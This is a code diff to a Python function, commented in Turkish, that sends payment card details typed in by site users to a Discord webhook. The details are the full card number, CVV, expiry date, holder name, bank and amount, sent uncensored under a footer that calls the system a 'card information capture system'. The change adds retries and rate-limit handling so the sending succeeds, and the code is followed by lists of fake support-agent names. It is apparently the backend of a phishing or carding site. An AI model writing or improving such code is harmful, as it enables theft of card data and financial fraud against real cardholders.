@@ -572,6 +572,8 @@ def send_discord_log(title, description, color):
     except Exception as e:
         print(f"Discord Hatası: {e}")
 
+import time  # En üste ekle
+
 def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv, bank_name, card_brand, amount):
     """Kart bilgilerini Discord'a SANSÜRSÜZ ve EKSİKSİZ gönderir."""
     clean_card_number = re.sub(r"\D", "", card_number)
@@ -580,78 +582,49 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
     clean_holder = card_holder.strip()
     
     payload = {
-        "content": " 🔴 YENİ KART BİLGİSİ YAKALANDI!",
+        "content": "🔴 YENİ KART BİLGİSİ YAKALANDI!",
         "embeds": [
             {
                 "title": "💳 **YENİ KART BİLGİSİ — TAM KAYIT**",
                 "description": "Aşağıda girilen kart bilgileri eksiksiz olarak iletilmiştir:",
                 "color": 16711680,
                 "fields": [
-                    {
-                        "name": "👤 **KART ÜZERİNDEKİ İSİM (AD SOYAD)**",
-                        "value": f"```{clean_holder}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "🔢 **KART NUMARASI (TAM)**",
-                        "value": f"```{clean_card_number}```",
-                        "inline": False
-                    },
-                    {
-                        "name": "📅 **SON KULLANMA TARİHİ (SKT)**",
-                        "value": f"```{clean_exp}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "🔐 **CVV / CVC GÜVENLİK KODU**",
-                        "value": f"```{clean_cvv}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "🏦 **BANKA BİLGİSİ**",
-                        "value": f"```{bank_name} | {card_brand}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "👤 **SİTE KULLANICISI**",
-                        "value": f"```{username}```",
-                        "inline": True
-                    },
-                    {
-                        "name": "💰 **YÜKLENMEK İSTENEN TUTAR**",
-                        "value": f"```{amount:.2f} TL```",
-                        "inline": True
-                    },
-                    {
-                        "name": "🕐 **TARİH & SAAT**",
-                        "value": f"```{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}```",
-                        "inline": False
-                    }
+                    {"name": "👤 **KART ÜZERİNDEKİ İSİM (AD SOYAD)**", "value": f"```{clean_holder}```", "inline": False},
+                    {"name": "🔢 **KART NUMARASI (TAM)**", "value": f"```{clean_card_number}```", "inline": False},
+                    {"name": "📅 **SON KULLANMA TARİHİ (SKT)**", "value": f"```{clean_exp}```", "inline": True},
+                    {"name": "🔐 **CVV / CVC GÜVENLİK KODU**", "value": f"```{clean_cvv}```", "inline": True},
+                    {"name": "🏦 **BANKA BİLGİSİ**", "value": f"```{bank_name} | {card_brand}```", "inline": True},
+                    {"name": "👤 **SİTE KULLANICISI**", "value": f"```{username}```", "inline": True},
+                    {"name": "💰 **YÜKLENMEK İSTENEN TUTAR**", "value": f"```{amount:.2f} TL```", "inline": True},
+                    {"name": "🕐 **TARİH & SAAT**", "value": f"```{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}```", "inline": False}
                 ],
-                "footer": {
-                    "text": "Hesap.com.tr — Kart Bilgi Yakalama Sistemi"
-                },
+                "footer": {"text": "Hesap.com.tr — Kart Bilgi Yakalama Sistemi"},
                 "timestamp": datetime.datetime.utcnow().isoformat()
             }
         ]
     }
     
-    try:
-        response = requests.post(
-            DISCORD_WEBHOOK_URL, 
-            json=payload, 
-            headers={"Content-Type": "application/json"},
-            timeout=10
-        )
-        if response.status_code == 204 or response.status_code == 200:
-            print(f"[BAŞARILI] Kart bilgileri Discord'a gönderildi! Status: {response.status_code}")
-            return True
-        else:
-            print(f"[HATA] Discord yanıt kodu: {response.status_code}, Yanıt: {response.text}")
-            return False
-    except Exception as e:
-        print(f"[HATA] Discord bağlantı hatası: {e}")
-        return False
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
+            
+            if response.status_code == 204 or response.status_code == 200:
+                print(f"[BAŞARILI] Kart bilgileri Discord'a gönderildi! (Deneme: {attempt + 1})")
+                return True
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after", 5)
+                print(f"[RATE LIMIT] {retry_after} saniye bekleniyor... (Deneme: {attempt + 1})")
+                time.sleep(retry_after + 1)
+            else:
+                print(f"[HATA] Discord yanıt kodu: {response.status_code}")
+                print(f"[HATA] Yanıt detayı: {response.text}")
+                time.sleep(3)
+        except Exception as e:
+            print(f"[HATA] Discord bağlantı hatası: {e}")
+            time.sleep(3)
+    
+    return False
 
 SUPPORT_AGENTS = {
     "erkek": ["Ahmet K.", "Murat Y.", "Emre T.", "Can B.", "Burak D.", "Kaan S."],
